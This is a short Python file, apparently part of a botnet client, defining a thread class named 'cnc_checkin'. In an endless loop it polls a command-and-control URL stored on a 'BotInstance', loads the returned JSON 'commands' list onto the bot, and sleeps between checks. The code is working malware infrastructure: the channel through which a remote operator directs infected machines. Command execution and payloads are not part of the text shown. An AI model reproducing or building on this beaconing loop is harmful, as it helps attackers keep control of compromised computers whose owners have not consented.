from threading import Thread
from time import sleep
import json
import requests

class cnc_checkin(Thread):

    def __init__(self,BotInstance):
        Thread.__init__(self)
        self.BotInstance = BotInstance
        
    def run(self):
        while(True):
            curr_commands = requests.get(self.BotInstance.cnc_url)
            try:
                curr_commands = curr_commands.json()['commands']
            except:
                raise

            if curr_commands != self.BotInstance.commands:
                self.BotInstance.commands = curr_commands
            
            sleep(self.BotInstance.wait_time)



     
     

